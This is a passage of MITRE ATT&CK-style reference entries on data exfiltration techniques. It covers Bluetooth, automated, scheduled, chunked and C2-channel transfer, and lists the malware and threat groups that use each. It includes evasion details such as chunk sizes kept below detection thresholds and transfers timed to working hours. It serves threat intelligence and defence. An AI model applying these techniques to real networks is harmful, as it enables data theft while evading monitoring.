### T1011 - Exfiltration Over Other Network Medium

Description:

Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.

Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.

#### T1011.001 - Exfiltration Over Bluetooth

Description:

Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.

Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.

Procedures:

- [S0143] Flame: [Flame](https://attack.mitre.org/software/S0143) has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.(Citation: Symantec Beetlejuice)


### T1020 - Automated Exfiltration

Description:

Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).

Procedures:

- [S0491] StrongPity: [StrongPity](https://attack.mitre.org/software/S0491) can automatically exfiltrate collected documents to the C2 server.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020)
- [S0395] LightNeuron: [LightNeuron](https://attack.mitre.org/software/S0395) can be configured to automatically exfiltrate files under a specified directory.(Citation: ESET LightNeuron May 2019)
- [C0001] Frankenstein: During [Frankenstein](https://attack.mitre.org/campaigns/C0001), the threat actors collected information via [Empire](https://attack.mitre.org/software/S0363), which was automatically sent back to the adversary's C2.(Citation: Talos Frankenstein June 2019)
- [G0121] Sidewinder: [Sidewinder](https://attack.mitre.org/groups/G0121) has configured tools to automatically send collected files to attacker controlled servers.(Citation: ATT Sidewinder January 2021)
- [S0363] Empire: [Empire](https://attack.mitre.org/software/S0363) has the ability to automatically send collected data back to the threat actors' C2.(Citation: Talos Frankenstein June 2019)
- [S0600] Doki: [Doki](https://attack.mitre.org/software/S0600) has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.(Citation: Intezer Doki July 20)
- [C0046] ArcaneDoor: [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) included scripted exfiltration of collected data.(Citation: CCCS ArcaneDoor 2024)
- [S0090] Rover: [Rover](https://attack.mitre.org/software/S0090) automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. [Rover](https://attack.mitre.org/software/S0090) also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.(Citation: Palo Alto Rover)
- [S1017] OutSteel: [OutSteel](https://attack.mitre.org/software/S1017) can automatically upload collected files to its C2 server.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )
- [S0643] Peppy: [Peppy](https://attack.mitre.org/software/S0643) has the ability to automatically exfiltrate files and keylogs.(Citation: Proofpoint Operation Transparent Tribe March 2016)
- [S0409] Machete: [Machete](https://attack.mitre.org/software/S0409)’s collected files are exfiltrated automatically to remote servers.(Citation: ESET Machete July 2019)
- [S0377] Ebury: If credentials are not collected for two weeks, [Ebury](https://attack.mitre.org/software/S0377) encrypts the credentials using a public key and sends them via UDP to an IP address located in the DNS TXT record.(Citation: ESET Windigo Mar 2014)(Citation: ESET Ebury May 2024)
- [S1148] Raccoon Stealer: [Raccoon Stealer](https://attack.mitre.org/software/S1148) will automatically collect and exfiltrate data identified in received configuration files from command and control nodes.(Citation: S2W Racoon 2022)(Citation: Sekoia Raccoon1 2022)(Citation: Sekoia Raccoon2 2022)
- [S1166] Solar: [Solar](https://attack.mitre.org/software/S1166) can automatically exfitrate files from compromised systems.(Citation: ESET OilRig Campaigns Sep 2023)
- [S1211] Hannotog: [Hannotog](https://attack.mitre.org/software/S1211) can upload encyrpted data for exfiltration.(Citation: Symantec Bilbug 2022)
- [G0004] Ke3chang: [Ke3chang](https://attack.mitre.org/groups/G0004) has performed  frequent and scheduled data exfiltration from compromised networks.(Citation: Microsoft NICKEL December 2021)
- [G1039] RedCurl: [RedCurl](https://attack.mitre.org/groups/G1039) has used batch scripts to exfiltrate data.(Citation: group-ib_redcurl1)(Citation: group-ib_redcurl2)
- [S0467] TajMahal: [TajMahal](https://attack.mitre.org/software/S0467) has the ability to manage an automated queue of egress files and commands sent to its C2.(Citation: Kaspersky TajMahal April 2019)
- [G1035] Winter Vivern: [Winter Vivern](https://attack.mitre.org/groups/G1035) delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.(Citation: CERT-UA WinterVivern 2023)
- [S0136] USBStealer: [USBStealer](https://attack.mitre.org/software/S0136) automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine. (Citation: ESET Sednit USBStealer 2014)
- [S0538] Crutch: [Crutch](https://attack.mitre.org/software/S0538) has automatically exfiltrated stolen files to Dropbox.(Citation: ESET Crutch December 2020)
- [G0081] Tropic Trooper: [Tropic Trooper](https://attack.mitre.org/groups/G0081) has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.(Citation: TrendMicro Tropic Trooper May 2020)
- [G0047] Gamaredon Group: [Gamaredon Group](https://attack.mitre.org/groups/G0047) has used modules that automatically upload gathered documents to the C2 server.(Citation: ESET Gamaredon June 2020)
- [S0445] ShimRatReporter: [ShimRatReporter](https://attack.mitre.org/software/S0445) sent collected system and network information compiled into a report to an adversary-controlled C2.(Citation: FOX-IT May 2016 Mofang)
- [S0050] CosmicDuke: [CosmicDuke](https://attack.mitre.org/software/S0050) exfiltrates collected files automatically over FTP to remote servers.(Citation: F-Secure Cosmicduke)
- [S0438] Attor: [Attor](https://attack.mitre.org/software/S0438) has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.(Citation: ESET Attor Oct 2019)
- [S1183] StrelaStealer: [StrelaStealer](https://attack.mitre.org/software/S1183) automatically sends gathered email credentials following collection to command and control servers via HTTP POST.(Citation: DCSO StrelaStealer 2022)(Citation: IBM StrelaStealer 2024)
- [S0131] TINYTYPHON: When a document is found matching one of the extensions in the configuration, [TINYTYPHON](https://attack.mitre.org/software/S0131) uploads it to the C2 server.(Citation: Forcepoint Monsoon)

#### T1020.001 - Traffic Duplication

Description:

Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)

Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)

Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)

Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.


### T1029 - Scheduled Transfer

Description:

Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.

When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).

Procedures:

- [S0283] jRAT: [jRAT](https://attack.mitre.org/software/S0283) can be configured to reconnect at certain intervals.(Citation: Kaspersky Adwind Feb 2016)
- [S0696] Flagpro: [Flagpro](https://attack.mitre.org/software/S0696) has the ability to wait for a specified time interval between communicating with and executing commands from C2.(Citation: NTT Security Flagpro new December 2021)
- [S1019] Shark: [Shark](https://attack.mitre.org/software/S1019) can pause C2 communications for a specified time.(Citation: ClearSky Siamesekitten August 2021)
- [S0395] LightNeuron: [LightNeuron](https://attack.mitre.org/software/S0395) can be configured to exfiltrate data during nighttime or working hours.(Citation: ESET LightNeuron May 2019)
- [S0223] POWERSTATS: [POWERSTATS](https://attack.mitre.org/software/S0223) can sleep for a given number of seconds.(Citation: FireEye MuddyWater Mar 2018)
- [S0200] Dipsind: [Dipsind](https://attack.mitre.org/software/S0200) can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.(Citation: Microsoft PLATINUM April 2016)
- [S0126] ComRAT: [ComRAT](https://attack.mitre.org/software/S0126) has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).(Citation: ESET ComRAT May 2020)
- [S0045] ADVSTORESHELL: [ADVSTORESHELL](https://attack.mitre.org/software/S0045) collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.(Citation: ESET Sednit Part 2)
- [S0211] Linfo: [Linfo](https://attack.mitre.org/software/S0211) creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.(Citation: Symantec Linfo May 2012)
- [S1100] Ninja: [Ninja](https://attack.mitre.org/software/S1100) can configure its agent to work only in specific time frames.(Citation: Kaspersky ToddyCat June 2022)
- [S0154] Cobalt Strike: [Cobalt Strike](https://attack.mitre.org/software/S0154) can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.(Citation: cobaltstrike manual)
- [S0444] ShimRat: [ShimRat](https://attack.mitre.org/software/S0444) can sleep when instructed to do so by the C2.(Citation: FOX-IT May 2016 Mofang)
- [S0409] Machete: [Machete](https://attack.mitre.org/software/S0409) sends stolen data to the C2 server every 10 minutes.(Citation: ESET Machete July 2019)
- [G0126] Higaisa: [Higaisa](https://attack.mitre.org/groups/G0126) sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.(Citation: PTSecurity Higaisa 2020)
- [S0596] ShadowPad: [ShadowPad](https://attack.mitre.org/software/S0596) has sent data back to C2 every 8 hours.(Citation: Securelist ShadowPad Aug 2017)
- [S0668] TinyTurla: [TinyTurla](https://attack.mitre.org/software/S0668) contacts its C2 based on a scheduled timing set in its configuration.(Citation: Talos TinyTurla September 2021)
- [S0667] Chrommme: [Chrommme](https://attack.mitre.org/software/S0667) can set itself to sleep before requesting a new command from C2.(Citation: ESET Gelsemium June 2021)
- [S0265] Kazuar: [Kazuar](https://attack.mitre.org/software/S0265) can sleep for a specific time and be set to communicate at specific intervals.(Citation: Unit 42 Kazuar May 2017)


### T1030 - Data Transfer Size Limits

Description:

An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.

Procedures:

- [G1040] Play: [Play](https://attack.mitre.org/groups/G1040) has split victims' files into chunks for exfiltration.(Citation: CISA Play Ransomware Advisory December 2023)(Citation: Trend Micro Ransomware Spotlight Play July 2023)
- [G1014] LuminousMoth: [LuminousMoth](https://attack.mitre.org/groups/G1014) has split archived files into multiple parts to bypass a 5MB limit.(Citation: Bitdefender LuminousMoth July 2021)
- [G0027] Threat Group-3390: [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors have split RAR files for exfiltration into parts.(Citation: Dell TG-3390)
- [S0264] OopsIE: [OopsIE](https://attack.mitre.org/software/S0264) exfiltrates command output and collected files to its C2 server in 1500-byte blocks.(Citation: Unit 42 OopsIE! Feb 2018)
- [S0150] POSHSPY: [POSHSPY](https://attack.mitre.org/software/S0150) uploads data in 2048-byte chunks.(Citation: FireEye POSHSPY April 2017)
- [C0026] C0026: During [C0026](https://attack.mitre.org/campaigns/C0026), the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.(Citation: Mandiant Suspected Turla Campaign February 2023)
- [S0487] Kessel: [Kessel](https://attack.mitre.org/software/S0487) can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.(Citation: ESET ForSSHe December 2018)
- [S1020] Kevin: [Kevin](https://attack.mitre.org/software/S1020) can exfiltrate data to the C2 server in 27-character chunks.(Citation: Kaspersky Lyceum October 2021)
- [S0644] ObliqueRAT: [ObliqueRAT](https://attack.mitre.org/software/S0644) can break large files of interest into smaller chunks to prepare them for exfiltration.(Citation: Talos Oblique RAT March 2021)
- [S1200] StealBit: [StealBit](https://attack.mitre.org/software/S1200) can be configured to exfiltrate files at a specified rate to evade network detection mechanisms.(Citation: Cybereason StealBit Exfiltration Tool)
- [S0622] AppleSeed: [AppleSeed](https://attack.mitre.org/software/S0622) has divided files if the size is 0x1000000 bytes or more.(Citation: KISA Operation Muzabi)
- [S0154] Cobalt Strike: [Cobalt Strike](https://attack.mitre.org/software/S0154) will break large data sets into smaller chunks for exfiltration.(Citation: cobaltstrike manual)
- [S0495] RDAT: [RDAT](https://attack.mitre.org/software/S0495) can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. [RDAT](https://attack.mitre.org/software/S0495) can also download data from the C2 which is split into 81,920-byte portions.(Citation: Unit42 RDAT July 2020)
- [S0699] Mythic: [Mythic](https://attack.mitre.org/software/S0699) supports custom chunk sizes used to upload/download files.(Citation: Mythc Documentation)
- [S1040] Rclone: The [Rclone](https://attack.mitre.org/software/S1040) "chunker" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021)
- [G0007] APT28: [APT28](https://attack.mitre.org/groups/G0007) has split archived exfiltration files into chunks smaller than 1MB.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)
- [C0015] C0015: During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors limited [Rclone](https://attack.mitre.org/software/S1040)'s bandwidth setting during exfiltration.(Citation: DFIR Conti Bazar Nov 2021)
- [S1141] LunarWeb: [LunarWeb](https://attack.mitre.org/software/S1141) can split exfiltrated data that exceeds 1.33 MB in size into multiple random sized parts between 384 and 512 KB.(Citation: ESET Turla Lunar toolset May 2024)
- [G0096] APT41: [APT41](https://attack.mitre.org/groups/G0096) transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.(Citation: Rostovcev APT41 2021)
- [S0030] Carbanak: [Carbanak](https://attack.mitre.org/software/S0030) exfiltrates data in compressed chunks if a message is larger than 4096 bytes .(Citation: FireEye CARBANAK June 2017)
- [S0170] Helminth: [Helminth](https://attack.mitre.org/software/S0170) splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.(Citation: Palo Alto OilRig May 2016)


### T1041 - Exfiltration Over C2 Channel

Description:

Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.

Procedures:

- [S1172] OilBooster: [OilBooster](https://attack.mitre.org/software/S1172) can use an actor-controlled OneDrive account for C2 communication and exfiltration.(Citation: ESET OilRig Downloaders DEC 2023)
- [S0459] MechaFlounder: [MechaFlounder](https://attack.mitre.org/software/S0459) has the ability to send the compromised user's account name and hostname within a URL to C2.(Citation: Unit 42 MechaFlounder March 2019)
- [S0428] PoetRAT: [PoetRAT](https://attack.mitre.org/software/S0428) has exfiltrated data over the C2 channel.(Citation: Talos PoetRAT October 2020)
- [S0445] ShimRatReporter: [ShimRatReporter](https://attack.mitre.org/software/S0445) sent generated reports to the C2 via HTTP POST requests.(Citation: FOX-IT May 2016 Mofang)
- [S1019] Shark: [Shark](https://attack.mitre.org/software/S1019) has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.(Citation: ClearSky Siamesekitten August 2021)
- [S1210] Sagerunex: [Sagerunex](https://attack.mitre.org/software/S1210) encrypts collected system data then exfiltrates via existing command and control channels.(Citation: Cisco LotusBlossom 2025)
- [S0533] SLOTHFULMEDIA: [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) has sent system information to a C2 server via HTTP and HTTPS POST requests.(Citation: CISA MAR SLOTHFULMEDIA October 2020)
- [S1183] StrelaStealer: [StrelaStealer](https://attack.mitre.org/software/S1183) exfiltrates collected email credentials via HTTP POST to command and control servers.(Citation: DCSO StrelaStealer 2022)(Citation: PaloAlto StrelaStealer 2024)(Citation: Fortgale StrelaStealer 2023)(Citation: IBM StrelaStealer 2024)
- [S1017] OutSteel: [OutSteel](https://attack.mitre.org/software/S1017) can upload files from a compromised host over its C2 channel.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )
- [S0234] Bandook: [Bandook](https://attack.mitre.org/software/S0234) can upload files from a victim's machine over the C2 channel.(Citation: CheckPoint Bandook Nov 2020)
- [S0431] HotCroissant: [HotCroissant](https://attack.mitre.org/software/S0431) has the ability to download files from the infected host to the command and control (C2) server.(Citation: Carbon Black HotCroissant April 2020)
- [S1021] DnsSystem: [DnsSystem](https://attack.mitre.org/software/S1021) can exfiltrate collected data to its C2 server.(Citation: Zscaler Lyceum DnsSystem June 2022)
- [S0409] Machete: [Machete](https://attack.mitre.org/software/S0409)'s collected data is exfiltrated over the same channel used for C2.(Citation: ESET Machete July 2019)
- [S1039] Bumblebee: [Bumblebee](https://attack.mitre.org/software/S1039) can send collected data in JSON format to C2.(Citation: Google EXOTIC LILY March 2022)
- [S0584] AppleJeus: [AppleJeus](https://attack.mitre.org/software/S0584) has exfiltrated collected host information to a C2 server.(Citation: CISA AppleJeus Feb 2021)
- [S1090] NightClub: [NightClub](https://attack.mitre.org/software/S1090) can use SMTP and DNS for file exfiltration and C2.(Citation: MoustachedBouncer ESET August 2023)
- [S1188] Line Runner: [Line Runner](https://attack.mitre.org/software/S1188) utilizes HTTP to retrieve and exfiltrate information staged using [Line Dancer](https://attack.mitre.org/software/S1186).(Citation: Cisco ArcaneDoor 2024)
- [S0670] WarzoneRAT: [WarzoneRAT](https://attack.mitre.org/software/S0670) can send collected victim data to its C2 server.(Citation: Check Point Warzone Feb 2020)
- [S0678] Torisma: [Torisma](https://attack.mitre.org/software/S0678) can send victim data to an actor-controlled C2 server.(Citation: McAfee Lazarus Nov 2020)
- [S1042] SUGARDUMP: [SUGARDUMP](https://attack.mitre.org/software/S1042) has sent stolen credentials and other data to its C2 server.(Citation: Mandiant UNC3890 Aug 2022)
- [S1030] Squirrelwaffle: [Squirrelwaffle](https://attack.mitre.org/software/S1030) has exfiltrated victim data using HTTP POST requests to its C2 servers.(Citation: ZScaler Squirrelwaffle Sep 2021)
- [G1014] LuminousMoth: [LuminousMoth](https://attack.mitre.org/groups/G1014) has used malware that exfiltrates stolen data to its C2 server.(Citation: Kaspersky LuminousMoth July 2021)
- [G0034] Sandworm Team: [Sandworm Team](https://attack.mitre.org/groups/G0034) has sent system information to its C2 server using HTTP.(Citation: ESET Telebots Dec 2016)
- [G0114] Chimera: [Chimera](https://attack.mitre.org/groups/G0114) has used [Cobalt Strike](https://attack.mitre.org/software/S0154) C2 beacons for data exfiltration.(Citation: NCC Group Chimera January 2021)
- [C0038] HomeLand Justice: During [HomeLand Justice](https://attack.mitre.org/campaigns/C0038), threat actors used HTTP to transfer data from compromised Exchange servers.(Citation: CISA Iran Albanian Attacks September 2022)
- [S0661] FoggyWeb: [FoggyWeb](https://attack.mitre.org/software/S0661) can remotely exfiltrate sensitive information from a compromised AD FS server.(Citation: MSTIC FoggyWeb September 2021)
- [S0484] Carberp: [Carberp](https://attack.mitre.org/software/S0484) has exfiltrated data via HTTP to already established C2 servers.(Citation: Prevx Carberp March 2011)(Citation: Trusteer Carberp October 2010)
- [S0083] Misdat: [Misdat](https://attack.mitre.org/software/S0083) has uploaded files and data to its C2 servers.(Citation: Cylance Dust Storm)
- [S1142] LunarMail: [LunarMail](https://attack.mitre.org/software/S1142) can use email image attachments with embedded data for receiving C2 commands and data exfiltration.(Citation: ESET Turla Lunar toolset May 2024)
- [S1065] Woody RAT: [Woody RAT](https://attack.mitre.org/software/S1065) can exfiltrate files from an infected machine to its C2 server.(Citation: MalwareBytes WoodyRAT Aug 2022)
- [S0491] StrongPity: [StrongPity](https://attack.mitre.org/software/S0491) can exfiltrate collected documents through C2 channels.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020)
- [S0034] NETEAGLE: [NETEAGLE](https://attack.mitre.org/software/S0034) is capable of reading files over the C2 channel.(Citation: FireEye APT30)
- [C0046] ArcaneDoor: [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) included use of existing command and control channels for data exfiltration.(Citation: Cisco ArcaneDoor 2024)(Citation: CCCS ArcaneDoor 2024)
- [S1185] LightSpy: To exfiltrate data, [LightSpy](https://attack.mitre.org/software/S1185) configures each module to send an obfuscated JSON blob to hardcoded URL endpoints or paths aligned to the module name.(Citation: Huntress LightSpy macOS 2024)
- [G0093] GALLIUM: [GALLIUM](https://attack.mitre.org/groups/G0093) used Web shells and [HTRAN](https://attack.mitre.org/software/S0040) for C2 and to exfiltrate data.(Citation: Cybereason Soft Cell June 2019)
- [G0126] Higaisa: [Higaisa](https://attack.mitre.org/groups/G0126) exfiltrated data over its C2 channel.(Citation: Zscaler Higaisa 2020)
- [S0658] XCSSET: [XCSSET](https://attack.mitre.org/software/S0658) retrieves files that match the pattern defined in the INAME_QUERY variable within the user's home directory, such as `*test.txt`, and are below a specific size limit. It then archives the files and exfiltrates the data over its C2 channel.(Citation: trendmicro xcsset xcode project 2020)(Citation: Microsoft March 2025 XCSSET)
- [S0363] Empire: [Empire](https://attack.mitre.org/software/S0363) can send data gathered from a target through the command and control channel.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019)
- [S0192] Pupy: [Pupy](https://attack.mitre.org/software/S0192) can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.(Citation: GitHub Pupy)
- [S0395] LightNeuron: [LightNeuron](https://attack.mitre.org/software/S0395) exfiltrates data over its email C2 channel.(Citation: ESET LightNeuron May 2019)
- [S0531] Grandoreiro: [Grandoreiro](https://attack.mitre.org/software/S0531) can send data it retrieves to the C2 server.(Citation: ESET Grandoreiro April 2020)
- [S1201] TRANSLATEXT: [TRANSLATEXT](https://attack.mitre.org/software/S1201) has exfiltrated collected credentials to the C2 server.(Citation: Zscaler Kimsuky TRANSLATEXT)
- [S1186] Line Dancer: [Line Dancer](https://attack.mitre.org/software/S1186) exfiltrates collected data via command and control channels.(Citation: Cisco ArcaneDoor 2024)
- [S0266] TrickBot: [TrickBot](https://attack.mitre.org/software/S0266) can send information about the compromised host and upload data to a hardcoded C2 server.(Citation: Cyberreason Anchor December 2019)(Citation: Bitdefender Trickbot VNC module Whitepaper 2021)
- [S1037] STARWHALE: [STARWHALE](https://attack.mitre.org/software/S1037) can exfiltrate collected data to its C2 servers.(Citation: DHS CISA AA22-055A MuddyWater February 2022)
- [S0657] BLUELIGHT: [BLUELIGHT](https://attack.mitre.org/software/S0657) has exfiltrated data over its C2 channel.(Citation: Volexity InkySquid BLUELIGHT August 2021)
- [S0650] QakBot: [QakBot](https://attack.mitre.org/software/S0650) can send stolen information to C2 nodes including passwords, accounts, and emails.(Citation: Kaspersky QakBot September 2021)
- [S0386] Ursnif: [Ursnif](https://attack.mitre.org/software/S0386) has used HTTP POSTs to exfil gathered information.(Citation: TrendMicro Ursnif Mar 2015)(Citation: FireEye Ursnif Nov 2017)(Citation: ProofPoint Ursnif Aug 2016)
- [S1173] PowerExchange: [PowerExchange](https://attack.mitre.org/software/S1173) can exfiltrate files via its email C2 channel.(Citation: Symantec Crambus OCT 2023)
- [S0351] Cannon: [Cannon](https://attack.mitre.org/software/S0351) exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.(Citation: Unit42 Cannon Nov 2018)
- [S1111] DarkGate: [DarkGate](https://attack.mitre.org/software/S1111) uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.(Citation: Ensilo Darkgate 2018)
- [S0674] CharmPower: [CharmPower](https://attack.mitre.org/software/S0674) can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.(Citation: Check Point APT35 CharmPower January 2022)
- [S0340] Octopus: [Octopus](https://attack.mitre.org/software/S0340) has uploaded stolen files and data from a victim's machine over its C2 channel.(Citation: Securelist Octopus Oct 2018)
- [S0085] S-Type: [S-Type](https://attack.mitre.org/software/S0085) has uploaded data and files from a compromised host to its C2 servers.(Citation: Cylance Dust Storm)
- [G0004] Ke3chang: [Ke3chang](https://attack.mitre.org/groups/G0004) transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.(Citation: Mandiant Operation Ke3chang November 2014)
- [S1064] SVCReady: [SVCReady](https://attack.mitre.org/software/S1064) can send collected data in JSON format to its C2 server.(Citation: HP SVCReady Jun 2022)
- [G0087] APT39: [APT39](https://attack.mitre.org/groups/G0087) has exfiltrated stolen victim data through C2 communications.(Citation: FBI FLASH APT39 September 2020)
- [S0455] Metamorfo: [Metamorfo](https://attack.mitre.org/software/S0455) can send the data it collects to the C2 server.(Citation: ESET Casbaneiro Oct 2019)
- [S0496] REvil: [REvil](https://attack.mitre.org/software/S0496) can exfiltrate host and malware information to C2 servers.(Citation: Secureworks REvil September 2019)
- [S0079] MobileOrder: [MobileOrder](https://attack.mitre.org/software/S0079) exfiltrates data to its C2 server over the same protocol as C2 communications.(Citation: Scarlet Mimic Jan 2016)
- [S0367] Emotet: [Emotet](https://attack.mitre.org/software/S0367) has exfiltrated data over its C2 channel.(Citation: Trend Micro Emotet Jan 2019)(Citation: Binary Defense Emotes Wi-Fi Spreader)
- [G0032] Lazarus Group: [Lazarus Group](https://attack.mitre.org/groups/G0032) has exfiltrated data and files over a C2 channel through its various tools and malware.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)
- [S1025] Amadey: [Amadey](https://attack.mitre.org/software/S1025) has sent victim data to its C2 servers.(Citation: BlackBerry Amadey 2020)
- [S0493] GoldenSpy: [GoldenSpy](https://attack.mitre.org/software/S0493) has exfiltrated host environment information to an external C2 domain via port 9006.(Citation: Trustwave GoldenSpy June 2020)
- [S0062] DustySky: [DustySky](https://attack.mitre.org/software/S0062) has exfiltrated data to the C2 server.(Citation: Kaspersky MoleRATs April 2019)
- [S0251] Zebrocy: [Zebrocy](https://attack.mitre.org/software/S0251) has exfiltrated data to the designated C2 server using HTTP POST requests.(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: CISA Zebrocy Oct 2020)
- [S0375] Remexi: [Remexi](https://attack.mitre.org/software/S0375) performs exfiltration over [BITSAdmin](https://attack.mitre.org/software/S0190), which is also used for the C2 channel.(Citation: Securelist Remexi Jan 2019)
- [S0600] Doki: [Doki](https://attack.mitre.org/software/S0600) has used Ngrok to establish C2 and exfiltrate data.(Citation: Intezer Doki July 20)
- [S1020] Kevin: [Kevin](https://attack.mitre.org/software/S1020) can send data from the victim host through a DNS C2 channel.(Citation: Kaspersky Lyceum October 2021)
- [S1156] Manjusaka: [Manjusaka](https://attack.mitre.org/software/S1156) data exfiltration takes place over HTTP channels.(Citation: Talos Manjusaka 2022)
- [S1022] IceApple: [IceApple](https://attack.mitre.org/software/S1022)'s Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.(Citation: CrowdStrike IceApple May 2022)
- [S0467] TajMahal: [TajMahal](https://attack.mitre.org/software/S0467) has the ability to send collected files over its C2.(Citation: Kaspersky TajMahal April 2019)
- [S1029] AuTo Stealer: [AuTo Stealer](https://attack.mitre.org/software/S1029) can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.(Citation: MalwareBytes SideCopy Dec 2021)
- [C0049] Leviathan Australian Intrusions: [Leviathan](https://attack.mitre.org/groups/G0065) exfiltrated collected data over existing command and control channels during [Leviathan Australian Intrusions](https://attack.mitre.org/campaigns/C0049).(Citation: CISA Leviathan 2024)
- [G0022] APT3: [APT3](https://attack.mitre.org/groups/G0022) has a tool that exfiltrates data over the C2 channel.(Citation: FireEye Clandestine Fox)
- [C0017] C0017: During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used its Cloudflare services C2 channels for data exfiltration.(Citation: Mandiant APT41)
- [S1145] Pikabot: During the initial [Pikabot](https://attack.mitre.org/software/S1145) command and control check-in, [Pikabot](https://attack.mitre.org/software/S1145) will transmit collected system information encrypted using RC4.(Citation: Elastic Pikabot 2024)
- [C0006] Operation Honeybee: During [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), the threat actors uploaded stolen files to their C2 servers.(Citation: McAfee Honeybee)
- [S1044] FunnyDream: [FunnyDream](https://attack.mitre.org/software/S1044) can execute commands, including gathering user information, and send the results to C2.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [S1153] Cuckoo Stealer: [Cuckoo Stealer](https://attack.mitre.org/software/S1153) can send information about the targeted system to C2 including captured passwords, OS build, hostname, and username.(Citation: Kandji Cuckoo April 2024)
- [S1149] CHIMNEYSWEEP: [CHIMNEYSWEEP](https://attack.mitre.org/software/S1149)  can upload collected files to the command-and-control server.(Citation: Mandiant ROADSWEEP August 2022)
- [G0050] APT32: [APT32](https://attack.mitre.org/groups/G0050)'s backdoor has exfiltrated data using the already opened channel with its C&C server.(Citation: ESET OceanLotus Mar 2019)
- [C0022] Operation Dream Job: During [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), [Lazarus Group](https://attack.mitre.org/groups/G0032) exfiltrated data from a compromised host to actor-controlled C2 servers.(Citation: ClearSky Lazarus Aug 2020)
